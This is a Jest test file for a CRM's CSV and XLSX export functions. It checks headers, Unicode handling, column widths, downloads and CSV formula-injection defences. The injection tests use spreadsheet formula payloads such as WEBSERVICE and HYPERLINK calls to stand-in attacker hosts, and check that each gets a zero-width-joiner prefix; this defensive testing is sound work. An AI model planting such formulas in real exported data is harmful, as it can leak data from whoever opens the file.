import { type FieldMetadata } from '@/object-record/record-field/ui/types/FieldMetadata';
import { type ColumnDefinition } from '@/object-record/record-table/types/ColumnDefinition';
import { CSV_INJECTION_PREVENTION_ZWJ } from '@/spreadsheet-import/constants/CsvInjectionPreventionZwj';
import { mapWorkbook } from '@/spreadsheet-import/utils/mapWorkbook';

import {
  csvDownloader,
  displayedExportProgress,
  generateCsv,
} from '@/object-record/record-index/export/hooks/useRecordIndexExportRecords';
import {
  XLSX_COLUMN_WIDTH_MAX,
  XLSX_COLUMN_WIDTH_MIN,
  XLSX_MIME_TYPE,
  generateXlsx,
  getSpreadsheetExportColumnWidths,
  xlsxDownloader,
} from '@/spreadsheet/utils/generateXlsxExport';
import { getSpreadsheetExportColumnDefinitions } from '@/spreadsheet/utils/getSpreadsheetExportColumnDefinitions';
import { unzipSync } from 'fflate';
import { saveAs } from 'file-saver';
import { read } from 'xlsx-ugnis';
import { FieldMetadataType, RelationType } from '~/generated-metadata/graphql';

jest.mock('file-saver', () => ({
  saveAs: jest.fn(),
}));

jest.mock(
  '@/object-record/object-options-dropdown/hooks/useExportProcessRecordsForCSV',
  () => ({
    useExportProcessRecordsForCSV: jest.fn(),
  }),
);

jest.mock(
  '@/object-record/record-index/export/hooks/useRecordIndexLazyFetchRecords',
  () => ({
    useRecordIndexLazyFetchRecords: jest.fn(),
  }),
);

jest.mock('twenty-shared/utils', () => ({
  isDefined: (value: unknown) => value !== undefined && value !== null,
}));

jest.useFakeTimers();

describe('generateCsv', () => {
  it('generates a csv with formatted headers', async () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Foo',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'foo' },
      },
      {
        label: 'Empty',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'empty' },
      },
      {
        label: 'Nested link field',
        size: 150,
        type: FieldMetadataType.LINKS,
        metadata: { fieldName: 'nestedLinkField' },
      },
      {
        label: 'Relation',
        size: 120,
        type: FieldMetadataType.RELATION,
        metadata: {
          fieldName: 'relation',
          relationType: RelationType.MANY_TO_ONE,
        },
      },
    ];
    const rows = [
      {
        id: '1',
        bar: 'another field',
        empty: null,
        foo: 'some field',
        nestedLinkField: {
          __typename: 'Links',
          primaryLinkLabel: '',
          primaryLinkUrl: 'https://www.test.com',
          secondaryLinks:
            'secondary link 1: https://www.test.com\nsecondary link 2: https://www.test.com',
        },
        relation: 'a relation',
        relationId: 'relation-uuid',
      },
    ];
    const csv = generateCsv({ columns, rows });
    expect(csv).toEqual(
      [
        '\uFEFFsep=,',
        'Record ID,Foo,Empty,Link label,Link URL,Additional Links,Relation,ID of Relation',
        '1,some field,,,https://www.test.com,"secondary link 1: https://www.test.com\nsecondary link 2: https://www.test.com",a relation,relation-uuid',
      ].join('\r\n'),
    );
  });

  it('preserves long numeric identifiers as text in CSV output', () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'External ID',
        size: 120,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'externalId' },
      },
    ];

    const csv = generateCsv({
      columns,
      rows: [{ id: '1', externalId: '1234567890123456' }],
    });

    expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}1234567890123456`);
  });

  it('writes Excel-readable CSV that the importer maps back without losing text or IDs', () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Name',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'name' },
      },
      {
        label: 'Notes',
        size: 180,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'notes' },
      },
      {
        label: 'Company',
        size: 120,
        type: FieldMetadataType.RELATION,
        metadata: {
          fieldName: 'company',
          relationType: RelationType.MANY_TO_ONE,
        },
      },
      {
        label: 'Annual Revenue',
        size: 150,
        type: FieldMetadataType.CURRENCY,
        metadata: { fieldName: 'annualRevenue' },
      },
      {
        label: 'Headquarters',
        size: 180,
        type: FieldMetadataType.ADDRESS,
        metadata: { fieldName: 'headquarters' },
      },
      {
        label: 'Contact Name',
        size: 150,
        type: FieldMetadataType.FULL_NAME,
        metadata: { fieldName: 'contactName' },
      },
      {
        label: 'Created On',
        size: 120,
        type: FieldMetadataType.DATE,
        metadata: { fieldName: 'createdOn' },
      },
      {
        label: 'Last Update',
        size: 150,
        type: FieldMetadataType.DATE_TIME,
        metadata: { fieldName: 'lastUpdate' },
      },
    ];
    const csv = generateCsv({
      columns,
      rows: [
        {
          id: '8ac078c6-532f-4a5e-af5f-fcf76f7c2ed4',
          name: '00123',
          notes: 'Crème, Inc. said "hello"\nSecond line',
          company: 'Acme Corporation',
          companyId: '6fa459ea-ee8a-3ca4-894e-db77e160355e',
          annualRevenue: { amountMicros: 1234.56, currencyCode: 'EUR' },
          headquarters: {
            addressStreet1: '1 rue de la Paix',
            addressStreet2: 'Apt 2',
            addressCity: 'Tunis',
            addressState: 'Tunis',
            addressPostcode: '1000',
            addressCountry: 'Tunisia',
            addressLat: 36.8,
            addressLng: 10.18,
          },
          contactName: { firstName: 'Zoé', lastName: 'Ben Salem' },
          createdOn: '2025-02-03',
          lastUpdate: '2025-02-03 04:05:06 UTC',
        },
      ],
    });
    const workbook = read(new TextEncoder().encode(csv), {
      type: 'array',
      codepage: 65001,
      cellDates: true,
      dateNF: 'yyyy-mm-dd',
      raw: true,
      dense: true,
    });

    expect(mapWorkbook(workbook)).toEqual([
      [
        'Record ID',
        'Name',
        'Notes',
        'Company',
        'ID of Company',
        'Amount',
        'Currency',
        'Address',
        'Address 2',
        'City',
        'State',
        'Country',
        'Postcode',
        'Latitude',
        'Longitude',
        'First Name',
        'Last Name',
        'Created On',
        'Last Update',
      ],
      [
        '8ac078c6-532f-4a5e-af5f-fcf76f7c2ed4',
        '00123',
        'Crème, Inc. said "hello"\nSecond line',
        'Acme Corporation',
        '6fa459ea-ee8a-3ca4-894e-db77e160355e',
        '1234.56',
        'EUR',
        '1 rue de la Paix',
        'Apt 2',
        'Tunis',
        'Tunis',
        'Tunisia',
        '1000',
        '36.8',
        '10.18',
        'Zoé',
        'Ben Salem',
        '2025-02-03',
        '2025-02-03 04:05:06 UTC',
      ],
    ]);
  });

  it('generates csv with multi-select and array values as readable lines', () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Name',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'name' },
      },
      {
        label: 'Tags',
        size: 120,
        type: FieldMetadataType.MULTI_SELECT,
        metadata: { fieldName: 'tags' },
      },
      {
        label: 'Skills',
        size: 150,
        type: FieldMetadataType.ARRAY,
        metadata: { fieldName: 'skills' },
      },
    ];

    const rows = [
      {
        id: '1',
        name: 'John Doe',
        tags: 'DISTRIBUTOR\nIMPLEMENTATION',
        skills: 'JavaScript\nTypeScript\nReact',
      },
      {
        id: '2',
        name: 'Jane Smith',
        tags: 'PARTNER',
        skills: 'Python\nDjango',
      },
    ];

    const csv = generateCsv({ columns, rows });

    expect(csv).toContain('"DISTRIBUTOR\nIMPLEMENTATION"');
    expect(csv).toContain('"JavaScript\nTypeScript\nReact"');
    expect(csv).toContain('PARTNER');
    expect(csv).toContain('"Python\nDjango"');

    expect(csv).toContain('Record ID,Name,Tags,Skills');
    expect(csv).toContain('1,John Doe');
    expect(csv).toContain('2,Jane Smith');
  });

  it('generates csv with empty multi-select and array fields as empty cells', () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Name',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'name' },
      },
      {
        label: 'Tags',
        size: 120,
        type: FieldMetadataType.MULTI_SELECT,
        metadata: { fieldName: 'tags' },
      },
      {
        label: 'Skills',
        size: 150,
        type: FieldMetadataType.ARRAY,
        metadata: { fieldName: 'skills' },
      },
    ];

    const rows = [
      {
        id: '1',
        name: 'John Doe',
        tags: '',
        skills: '',
      },
    ];

    const csv = generateCsv({ columns, rows });

    expect(csv).toContain('Record ID,Name,Tags,Skills');
    expect(csv).toContain('1,John Doe,,');
  });

  describe('CSV Injection Prevention with ZWJ', () => {
    it('prevents formula injection with equals sign using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Name',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'name' },
        },
        {
          label: 'Formula',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'formula' },
        },
      ];

      const rows = [
        {
          id: '1',
          name: 'Test User',
          formula: '=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")`,
      );
      expect(csv).not.toContain(
        '1,Test User,=WEBSERVICE("http://attacker.com")',
      );
      expect(csv).toContain(
        `1,Test User,"${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")"`,
      );
    });

    it('prevents formula injection with plus sign using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Calculation',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'calculation' },
        },
      ];

      const rows = [
        {
          id: '1',
          calculation: '+1+1',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+1+1`);
      expect(csv).not.toContain('1,+1+1');
    });

    it('prevents formula injection with minus sign using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Calculation',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'calculation' },
        },
      ];

      const rows = [
        {
          id: '1',
          calculation: '-1+1',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}-1+1`);
      expect(csv).not.toContain('1,-1+1');
    });

    it('prevents formula injection with at symbol using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Reference',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'reference' },
        },
      ];

      const rows = [
        {
          id: '1',
          reference: '@SUM(1,1)',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}@SUM(1,1)`);
      expect(csv).not.toContain('1,@SUM(1,1)');
    });

    it('prevents formula injection with tab character using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Data',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'data' },
        },
      ];

      const rows = [
        {
          id: '1',
          data: '\t=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}\t=WEBSERVICE(""http://attacker.com"")`,
      );
      expect(csv).not.toContain('1,\t=WEBSERVICE("http://attacker.com")');
    });

    it('prevents formula injection with carriage return using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Data',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'data' },
        },
      ];

      const rows = [
        {
          id: '1',
          data: '\r=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}\r=WEBSERVICE(""http://attacker.com"")`,
      );
      expect(csv).not.toContain('1,\r=WEBSERVICE("http://attacker.com")');
    });

    it('handles multiple injection attempts in different fields with ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Field1',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'field1' },
        },
        {
          label: 'Field2',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'field2' },
        },
        {
          label: 'Field3',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'field3' },
        },
      ];

      const rows = [
        {
          id: '1',
          field1: '=WEBSERVICE("http://evil.com")',
          field2: '+SUM(A1:A10)',
          field3: '-HYPERLINK("http://malicious.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://evil.com"")`,
      );
      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+SUM(A1:A10)`);
      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}-HYPERLINK(""http://malicious.com"")`,
      );

      expect(csv).not.toContain('1,=WEBSERVICE("http://evil.com")');
      expect(csv).not.toContain(',+SUM(A1:A10)');
      expect(csv).not.toContain(',-HYPERLINK("http://malicious.com")');
    });

    it('preserves legitimate content that does not start with dangerous characters', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Name',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'name' },
        },
        {
          label: 'Email',
          size: 120,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'email' },
        },
        {
          label: 'Description',
          size: 200,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'description' },
        },
      ];

      const rows = [
        {
          id: '1',
          name: 'John Doe',
          email: 'john@example.com',
          description:
            'This is a normal description with = and + symbols in the middle',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain('John Doe');
      expect(csv).toContain('john@example.com');
      expect(csv).toContain(
        'This is a normal description with = and + symbols in the middle',
      );
    });
  });
});

describe('generateXlsx', () => {
  const getWorksheetXml = (bytes: Uint8Array): string => {
    const entries = unzipSync(bytes);
    const worksheetPath = Object.keys(entries).find((path) =>
      /^xl\/worksheets\/sheet\d+\.xml$/.test(path),
    );

    if (!worksheetPath) {
      throw new Error('Generated workbook worksheet was not found');
    }

    return new TextDecoder().decode(entries[worksheetPath]);
  };

  it('generates a valid workbook with the shared flattened export contract', () => {
    const columns = getSpreadsheetExportColumnDefinitions([
      {
        id: 'name-field',
        name: 'name',
        label: 'Name',
        type: FieldMetadataType.TEXT,
      },
      {
        id: 'company-field',
        name: 'company',
        label: 'Company',
        type: FieldMetadataType.RELATION,
        relation: { type: RelationType.MANY_TO_ONE },
      },
      {
        id: 'person-name-field',
        name: 'personName',
        label: 'Person name',
        type: FieldMetadataType.FULL_NAME,
      },
      {
        id: 'address-field',
        name: 'address',
        label: 'Address',
        type: FieldMetadataType.ADDRESS,
      },
      {
        id: 'amount-field',
        name: 'amount',
        label: 'Amount',
        type: FieldMetadataType.CURRENCY,
      },
      {
        id: 'website-field',
        name: 'website',
        label: 'Website',
        type: FieldMetadataType.LINKS,
      },
    ]);
    const rows = [
      {
        id: 'record-1',
        name: 'Élodie',
        company: 'Acme',
        companyId: 'company-1',
        personName: { firstName: 'Élodie', lastName: 'Ben Salem' },
        address: {
          addressStreet1: '1 Rue de la Paix',
          addressPostcode: '00123',
        },
        amount: { amountMicros: 1234.5, currencyCode: 'EUR' },
        website: {
          primaryLinkLabel: 'Site',
          primaryLinkUrl: 'https://example.com',
          secondaryLinks: 'LinkedIn: https://linkedin.com',
        },
      },
    ];

    const workbookBytes = generateXlsx({ columns, rows });
    const workbook = read(workbookBytes, { type: 'array', dense: true });
    const csvWorkbook = read(
      new TextEncoder().encode(generateCsv({ columns, rows })),
      { type: 'array', codepage: 65001, raw: true },
    );

    expect(workbook.SheetNames).toEqual(['Export']);
    const mappedWorkbook = mapWorkbook(workbook);

    expect(mapWorkbook(csvWorkbook)[0]).toEqual(mappedWorkbook[0]);
    expect(mappedWorkbook).toEqual([
      [
        'Record ID',
        'Name',
        'Company',
        'ID of Company',
        'First Name',
        'Last Name',
        'Address',
        'Address 2',
        'City',
        'State',
        'Country',
        'Postcode',
        'Latitude',
        'Longitude',
        'Amount',
        'Currency',
        'Link label',
        'Link URL',
        'Additional Links',
      ],
      [
        'record-1',
        'Élodie',
        'Acme',
        'company-1',
        'Élodie',
        'Ben Salem',
        '1 Rue de la Paix',
        undefined,
        undefined,
        undefined,
        undefined,
        '00123',
        undefined,
        undefined,
        '1234.5',
        'EUR',
        'Site',
        'https://example.com',
        'LinkedIn: https://linkedin.com',
      ],
    ]);

    const worksheetXml = getWorksheetXml(workbookBytes);
    expect(worksheetXml).toContain(
      '<pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>',
    );
    expect(worksheetXml).toContain('<autoFilter ref="A1:S2"/>');
  });

  it('preserves localized and custom Unicode headers natively', () => {
    const columns = getSpreadsheetExportColumnDefinitions([
      {
        id: 'owner-field',
        name: 'owner',
        label: 'Propriétaire du compte',
        type: FieldMetadataType.TEXT,
      },
      {
        id: 'tax-number-field',
        name: 'taxNumber',
        label: 'Numéro fiscal',
        type: FieldMetadataType.TEXT,
      },
    ]);
    const workbook = read(
      generateXlsx({
        columns,
        rows: [
          {
            id: 'record-1',
            owner: 'Équipe',
            taxNumber: 'TN-001',
          },
        ],
      }),
      { type: 'array', dense: true },
    );

    expect(mapWorkbook(workbook)[0]).toEqual([
      'Record ID',
      'Propriétaire du compte',
      'Numéro fiscal',
    ]);
  });

  it('keeps identifiers and formula-like text safe in XLSX cells', () => {
    const columns = getSpreadsheetExportColumnDefinitions([
      {
        id: 'external-id-field',
        name: 'externalId',
        label: 'External ID',
        type: FieldMetadataType.TEXT,
      },
      {
        id: 'formula-field',
        name: 'formula',
        label: 'Formula',
        type: FieldMetadataType.TEXT,
      },
    ]);
    const workbookBytes = generateXlsx({
      columns,
      rows: [
        {
          id: 'record-1',
          externalId: '001234567890123456',
          formula: '=WEBSERVICE("https://attacker.example")',
        },
      ],
    });
    const workbook = read(workbookBytes, { type: 'array', dense: true });
    const mappedWorkbook = mapWorkbook(workbook);

    expect(mappedWorkbook[1]).toEqual([
      'record-1',
      '001234567890123456',
      '=WEBSERVICE("https://attacker.example")',
    ]);
    expect(getWorksheetXml(workbookBytes)).toContain(
      `\u200d=WEBSERVICE(&quot;https://attacker.example&quot;)`,
    );
  });

  it('uses deterministic bounded widths based on headers and values', () => {
    const columns = getSpreadsheetExportColumnDefinitions([
      {
        id: 'short-field',
        name: 'short',
        label: 'Short',
        type: FieldMetadataType.TEXT,
      },
      {
        id: 'long-field',
        name: 'long',
        label: 'A very long metadata header that should be bounded',
        type: FieldMetadataType.TEXT,
      },
    ]);
    const rows = [
      {
        id: 'record-1',
        short: 'value',
        long: 'x'.repeat(200),
      },
    ];

    const widths = getSpreadsheetExportColumnWidths(columns, rows);

    expect(widths).toHaveLength(3);
    expect(widths.every((width) => width >= XLSX_COLUMN_WIDTH_MIN)).toBe(true);
    expect(widths.every((width) => width <= XLSX_COLUMN_WIDTH_MAX)).toBe(true);
    expect(widths[0]).toBe(11);
    expect(widths[2]).toBe(XLSX_COLUMN_WIDTH_MAX);
  });
});

describe('xlsxDownloader', () => {
  const mockSaveAs = saveAs as jest.MockedFunction<typeof saveAs>;

  beforeEach(() => {
    mockSaveAs.mockClear();
  });

  it('downloads an XLSX blob with the native workbook MIME type', () => {
    const columns = getSpreadsheetExportColumnDefinitions([
      {
        id: 'name-field',
        name: 'name',
        label: 'Name',
        type: FieldMetadataType.TEXT,
      },
    ]);

    xlsxDownloader('export.xlsx', {
      columns,
      rows: [{ id: 'record-1', name: 'Name' }],
    });

    const [blob, filename] = mockSaveAs.mock.calls[0] as [Blob, string];

    expect(filename).toBe('export.xlsx');
    expect(blob.type).toBe(XLSX_MIME_TYPE);
  });
});

describe('csvDownloader', () => {
  const mockSaveAs = saveAs as jest.MockedFunction<typeof saveAs>;

  beforeEach(() => {
    mockSaveAs.mockClear();
  });

  const readBlob = async (blob: Blob): Promise<ArrayBuffer> =>
    new Promise<ArrayBuffer>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as ArrayBuffer);
      reader.onerror = reject;
      reader.readAsArrayBuffer(blob);
    });

  const columns: Pick<
    ColumnDefinition<FieldMetadata>,
    'size' | 'label' | 'type' | 'metadata'
  >[] = [
    {
      label: 'Name',
      size: 100,
      type: FieldMetadataType.TEXT,
      metadata: { fieldName: 'name' },
    },
  ];

  it('prepends UTF-8 BOM (EF BB BF) as first three bytes', async () => {
    csvDownloader('export.csv', {
      columns,
      rows: [{ id: '1', name: 'test' }],
    });

    const blob = mockSaveAs.mock.calls[0][0] as Blob;
    const bytes = new Uint8Array(await readBlob(blob));

    expect(bytes[0]).toBe(0xef);
    expect(bytes[1]).toBe(0xbb);
    expect(bytes[2]).toBe(0xbf);
  });

  it.each([
    ['Arabic', 'مرحبا'],
    ['Chinese', '你好'],
    ['Japanese', 'こんにちは'],
    ['Korean', '안녕하세요'],
  ])('preserves %s characters in exported content', async (_, name) => {
    csvDownloader('export.csv', { columns, rows: [{ id: '1', name }] });

    const blob = mockSaveAs.mock.calls[0][0] as Blob;
    const text = Buffer.from(await readBlob(blob)).toString('utf-8');

    expect(text).toContain(name);
  });

  it('emits the downloaded Blob as one UTF-8 byte sequence', async () => {
    csvDownloader('export.csv', {
      columns: [
        {
          label: 'Propriétaire',
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'owner' },
        },
      ],
      rows: [{ id: '1', owner: 'Créé par' }],
    });

    const blob = mockSaveAs.mock.calls[0][0] as Blob;
    const bytes = new Uint8Array(await readBlob(blob));
    const expectedPrefix = new TextEncoder().encode(
      '\uFEFFsep=,\r\nRecord ID,Propriétaire',
    );
    const text = new TextDecoder('utf-8').decode(bytes);

    expect(blob.type).toBe('text/csv;charset=utf-8');
    expect(Array.from(bytes.slice(0, expectedPrefix.length))).toEqual(
      Array.from(expectedPrefix),
    );
    expect(text).toContain('Record ID,Propriétaire');
    expect(text).not.toContain('Ã');
  });
});

describe('displayedExportProgress', () => {
  it.each([
    [undefined, undefined, 'percentage', 'Export'],
    [20, 50, 'percentage', 'Export (40%)'],
    [0, 100, 'number', 'Export (0)'],
    [10, 10, 'percentage', 'Export (100%)'],
    [10, 10, 'number', 'Export (10)'],
    [7, 9, 'percentage', 'Export (78%)'],
  ])(
    'displays the export progress',
    (exportedRecordCount, totalRecordCount, displayType, expected) => {
      expect(
        displayedExportProgress({
          exportedRecordCount,
          totalRecordCount,
          displayType: displayType as 'percentage' | 'number',
        }),
      ).toEqual(expected);
    },
  );
});
